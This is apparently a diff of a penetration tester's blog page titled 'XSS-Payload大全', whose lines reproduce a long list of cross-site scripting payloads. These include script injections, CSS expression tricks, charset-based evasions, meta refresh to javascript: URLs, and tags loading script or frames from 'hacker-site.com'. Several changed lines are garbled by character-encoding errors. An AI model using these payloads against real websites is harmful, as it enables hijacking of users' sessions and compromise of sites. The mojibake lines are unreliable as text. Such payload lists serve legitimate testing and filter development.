@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>XSS-Payloadĺ¤§ĺ¨ | Falao&#39;s Blog</title>
+  <title>XSS-Payload | Falao&#39;s Blog</title>
   <meta name="keywords" content="">
-  <meta name="description" content="XSS-Payloadĺ¤§ĺ¨ | Falao&#39;s Blog">
+  <meta name="description" content="XSS-Payload | Falao&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="ID：法老职业：渗透测试工程师证书：OSCP&#x2F;CISP-PTE">
 <meta property="og:type" content="website">
@@ -358,7 +358,7 @@
            href="/2021/02/19/XSS-Payload%E5%A4%A7%E5%85%A8/"
            data-tag=""
            data-author="" >
-            <span class="post-title" title="XSS-Payloadĺ¤§ĺ¨">XSS-Payloadĺ¤§ĺ¨</span>
+            <span class="post-title" title="XSS-Payload">XSS-Payload</span>
             <span class="post-date" title="2021-02-19 20:14:56">2021/02/19</span>
         </a>
         
@@ -637,7 +637,7 @@
     <div class="pjax">
         <article id="post-XSS-Payload大全" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">XSS-Payloadĺ¤§ĺ¨</h1>
+        <h1 class="article-title">XSS-Payload</h1>
     
     <div class="article-meta">
         
@@ -655,7 +655,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-03-03 09:07:36'>2021-02-19 20:14</time>
+            Created At : <time class="date" title='Updated At: 2021-03-03 09:42:10'>2021-02-19 20:14</time>
         
     </div>
     <div class="article-meta">
@@ -775,7 +775,7 @@
 &lt;div style="font-family:'foo ;color:red;';"&gt;XXX
 &lt;div style="font-family:foo}color=red;"&gt;XXX
 &lt;// style=x:expression\28javascript:alert(1)\29&gt;
-&lt;style&gt;*{x:ď˝ď˝ď˝ď˝ď˝ď˝ď˝ď˝ď˝ď˝(javascript:alert(1))}&lt;/style&gt;
+&lt;style&gt;*{x:ÄËÂÄËÂÄËÂÄËÂÄËÂÄËÂÄËÂÄËÂÄËÂÄËÂ(javascript:alert(1))}&lt;/style&gt;
 &lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;
 &lt;div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"&gt;X
 &lt;div id=d&gt;&lt;div style="font-family:'sans\27\3B color\3Ared\3B'"&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById("d"))innerHTML=innerHTML&lt;/script&gt;
@@ -789,7 +789,7 @@
 &lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;
 &lt;meta charset="x-imap4-modified-utf7"&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi
 &lt;meta charset="x-imap4-modified-utf7"&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;
-&lt;meta charset="mac-farsi"&gt;ÂźscriptÂžjavascript:alert(1)Âź/scriptÂž
+&lt;meta charset="mac-farsi"&gt;ĂĹşscriptĂĹžjavascript:alert(1)ĂĹş/scriptĂĹž
 X&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;
 1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`behA:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src="x"onerror=javascript:alert(1)&gt;`&gt;
 &lt;IMG SRC="jav ascript:alert('XSS');"&gt;
@@ -829,7 +829,7 @@ exp/*&lt;A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'
 &lt;STYLE type="text/css"&gt;BODY{background:url("javascript:alert('XSS')")}&lt;/STYLE&gt;
 &lt;XSS STYLE="xss:expression(alert('XSS'))"&gt;
 &lt;XSS STYLE="behavior: url(xss.htc);"&gt;
-ÂźscriptÂžalert(Â˘XSSÂ˘)Âź/scriptÂž
+ĂĹşscriptĂĹžalert(ĂËXSSĂË)ĂĹş/scriptĂĹž
 &lt;META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"&gt;
 &lt;META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"&gt;
 &lt;META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"&gt;
@@ -1064,13 +1064,13 @@ http://www.simpatie.ro/index.php?page=top_movies&amp;cat=13&amp;p=2 p=2 ??XSS??
 &lt;/body&gt;
 &lt;/html&gt;
 &lt;SCRIPT SRC=http://hacker-site.com/xss.js&gt;&lt;/SCRIPT&gt;
-&lt;SCRIPT&gt; alert(âXSSâ); &lt;/SCRIPT&gt;
+&lt;SCRIPT&gt; alert(Ă˘ÂÂXSSĂ˘ÂÂ); &lt;/SCRIPT&gt;
 &lt;BODY ONLOAD=alert("XSS")&gt;
 &lt;BODY BACKGROUND="javascript:alert('XSS')"&gt;
 &lt;IMG SRC="javascript:alert('XSS');"&gt;
 &lt;IMG DYNSRC="javascript:alert('XSS')"&gt;
 &lt;IMG LOWSRC="javascript:alert('XSS')"&gt;
-&lt;IFRAME SRC=âhttp://hacker-site.com/xss.htmlâ&gt;
+&lt;IFRAME SRC=Ă˘ÂÂhttp://hacker-site.com/xss.htmlĂ˘ÂÂ&gt;
 &lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"&gt;
 &lt;LINK REL="stylesheet" HREF="javascript:alert('XSS');"&gt;
 &lt;TABLE BACKGROUND="javascript:alert('XSS')"&gt;
